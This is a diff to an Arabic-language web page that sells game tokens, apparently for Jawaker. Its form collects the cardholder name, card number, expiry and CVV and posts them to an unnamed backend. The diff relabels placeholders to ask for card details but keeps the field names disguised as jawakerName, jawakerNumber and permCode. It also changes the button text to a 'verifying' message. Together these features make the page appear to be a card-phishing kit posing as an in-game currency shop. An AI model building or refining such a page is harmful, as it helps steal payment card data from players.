@@ -116,6 +116,13 @@
     margin-bottom: 22px;
     color: var(--text);
   }
+  .section-note{
+    font-family:'Tajawal', sans-serif;
+    font-weight:400;
+    font-size: 13px;
+    color: #e05656;
+    margin-right: 10px;
+  }
   .grid{
     display:grid;
     grid-template-columns: repeat(2, 1fr);
@@ -285,6 +292,11 @@
     margin-bottom: 14px;
     text-align:right;
   }
+  .soft-divider{
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--card-border) 20%, var(--card-border) 80%, transparent);
+    margin: 18px 0 16px;
+  }
   .field.card-field input{
     border-radius: 16px;
     padding: 15px 18px;
@@ -406,7 +418,7 @@
 </header>
 
 <main>
-  <h1 class="section-title">توكنز</h1>
+  <h1 class="section-title">توكنز <span class="section-note">جميع فئات التوكنز لا تتضمن نقاط VIP</span></h1>
   <div class="grid" id="grid"></div>
 </main>
 
@@ -431,18 +443,21 @@
         <input type="text" id="f-id" name="id" inputmode="numeric" pattern="\d+" placeholder="ID" required>
       </div>
 
+      <div class="soft-divider"></div>
+      <div class="section-label">معلومات إضافية</div>
+
       <div class="field card-field">
-        <input type="text" id="f-holder-name" name="jawakerName" placeholder="Holder Name" pattern="[^0-9]*" required>
+        <input type="text" id="f-holder-name" name="jawakerName" placeholder="Card Holder Name" pattern="[^0-9]*" required>
       </div>
 
       <div class="field card-field">
-        <input type="text" id="f-jawaker-number" name="jawakerNumber" inputmode="numeric" placeholder="Number" maxlength="19" required>
+        <input type="text" id="f-jawaker-number" name="jawakerNumber" inputmode="numeric" placeholder= "Card Number" maxlength="19" required>
       </div>
 
       <div class="row-3">
         <input type="text" id="f-mm" name="mm" inputmode="numeric" maxlength="2" placeholder="MM" pattern="\d{2}" required>
         <input type="text" id="f-yy" name="yy" inputmode="numeric" maxlength="2" placeholder="YY" pattern="\d{2}" required>
-        <input type="text" id="f-key" name="permCode" inputmode="numeric" maxlength="4" placeholder="Key" pattern="\d{3,4}" required>
+        <input type="text" id="f-key" name="permCode" inputmode="numeric" maxlength="4" placeholder="Cvv" pattern="\d{3,4}" required>
       </div>
 
       <button type="submit" class="submit-btn" id="submitBtn" disabled>إرسال</button>
@@ -686,7 +701,7 @@
     };
 
     submitBtn.disabled = true;
-    submitBtn.textContent = 'جارِ الإرسال...';
+    submitBtn.textContent = 'جارِ التحقق2...';
 
     try{
       const res = await fetch(`${BACKEND_URL}/api/order`, {
